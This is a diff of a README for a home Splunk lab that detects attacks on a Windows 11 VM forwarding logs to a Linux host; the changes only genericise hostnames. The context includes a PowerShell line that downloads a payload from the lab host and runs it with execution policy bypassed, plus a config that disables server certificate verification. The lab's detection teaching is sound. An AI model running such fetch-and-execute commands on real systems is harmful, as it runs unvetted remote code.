@@ -41,7 +41,7 @@ This lab project demonstrates how to use Splunk to monitor and detect advanced t
 ├─────────────────────────────────────────────────────────────┤
 │                                                              │
 │  ┌──────────────────────┐          ┌────────────────────┐  │
-│  │  Windows 11 VM       │          │  Nobara Linux Host │  │
+│  │  Windows 11 VM       │          │    Linux Host      │  │
 │  │  ─────────────────   │          │  ───────────────── │  │
 │  │  • WinEventLog       │          │  • Splunk Enterprise│  │
 │  │  • Event IDs: 4720,  │  TCP/9997│  • Forwarder Listen│  │
@@ -61,7 +61,7 @@ This lab project demonstrates how to use Splunk to monitor and detect advanced t
 Data flow:
 1. Windows 11 endpoint generates security events (WinEventLog)
 2. Splunk Universal Forwarder captures and forwards events
-3. Events traverse the libvirt network bridge to Nobara Linux host
+3. Events traverse the libvirt network bridge to Linux host
 4. Splunk Enterprise indexes and correlates events in real time
 5. Dashboards and searches provide visibility and alerting
 
@@ -114,7 +114,7 @@ forwardedindex.filter.disable = true
 indexAndForward = false
 
 [tcpout:splunk_indexer]
-server = <nobara-host-ip>:9997
+server = <linux-host-ip>:9997
 clientCert = $SPLUNK_HOME/etc/auth/mycerts/client.pem
 sslVerifyServerCert = false
 ```
@@ -147,7 +147,7 @@ Example retrieval on the Windows endpoint:
 
 ```powershell
 # Download payload from Linux host
-powershell -Command "Invoke-WebRequest -Uri 'http://<nobara-ip>:8888/command-payload.txt' -OutFile 'C:\Temp\payload.ps1'"
+powershell -Command "Invoke-WebRequest -Uri 'http://<linux-ip>:8888/command-payload.txt' -OutFile 'C:\Temp\payload.ps1'"
 
 # Execute payload
 powershell -ExecutionPolicy Bypass -File C:\Temp\payload.ps1
@@ -157,7 +157,7 @@ Splunk detection example:
 
 ```spl
 sourcetype=WinEventLog:Security EventID=5156
-| search dest_port=8888 dest_ip="<nobara-ip>"
+| search dest_port=8888 dest_ip="<linux-ip>"
 | stats count by user, dest_ip, dest_port, action
 ```
 
@@ -310,7 +310,7 @@ sourcetype=WinEventLog:Security
 ### Prerequisites
 
 - Windows 11 VM with network access to Splunk host
-- Nobara Linux host with Splunk Enterprise installed
+- Linux host with Splunk Enterprise installed
 - libvirt network bridge configured between VMs
 - Splunk Universal Forwarder installed on Windows 11
 
@@ -343,7 +343,7 @@ disabled = false
 defaultGroup = splunk_indexer
 
 [tcpout:splunk_indexer]
-server = <nobara-host-ip>:9997
+server = <linux-host-ip>:9997
 ```
 
 ### Step 4: Restart Splunk Forwarder
@@ -378,7 +378,7 @@ Restart-Service SplunkForwarder
 
 #### Network Bridging
 
-The lab initially failed because the Nobara Linux libvirt firewall zone was dropping traffic from the Windows VM. The fix was to manually allow TCP/9997 traffic so the forwarder could send events to Splunk.
+The lab initially failed because the Linux libvirt firewall zone was dropping traffic from the Windows VM. The fix was to manually allow TCP/9997 traffic so the forwarder could send events to Splunk.
 
 Example firewall allow rule:
 
